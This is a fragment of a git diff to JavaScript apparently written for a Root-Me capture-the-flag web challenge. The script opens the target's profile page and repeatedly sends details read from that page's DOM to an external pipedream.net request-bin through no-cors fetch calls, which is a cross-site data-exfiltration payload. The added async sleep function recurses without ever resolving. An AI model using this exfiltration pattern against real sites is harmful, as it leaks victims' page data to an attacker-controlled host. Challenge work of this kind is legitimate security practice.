@@ -26,7 +26,7 @@ try{
 
 
 try{
-	var aaa = open('http://challenge01.root-me.org:58003/profile');
+	var aaa = open('http://challenge01.root-me.org:58003/profile', '_self');
 
 	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?size0=' + aaa.document.body.childElementCount, {mode: 'no-cors'});
 
@@ -36,8 +36,27 @@ try{
 
 	fetch('https://en6gc9c8vfzvo.x.pipedream.net/?size3=' + aaa.document.body.childElementCount, {mode: 'no-cors'});
 
-	
-	yolo(aaa)
+
+	(async () => {
+	    setTimeout(function() {}, 3000);
+
+	    async function sleep() {
+	            await new Promise(resolve => {
+	                setTimeout(async function() {
+	                    await sleep();
+	                    resolve()
+	                }, 1000);
+	            });
+	        
+	        return;
+	    }
+
+	    await sleep();
+	    fetch('https://en6gc9c8vfzvo.x.pipedream.net/?size6=' + aaa.document.body.childElementCount, {mode: 'no-cors'});
+
+	})();
+
+
 	aaa.onload = function() {fetch('https://en6gc9c8vfzvo.x.pipedream.net/?loaded0', {mode: 'no-cors'});}
 	aaa.addEventListener('load', function() {
     	
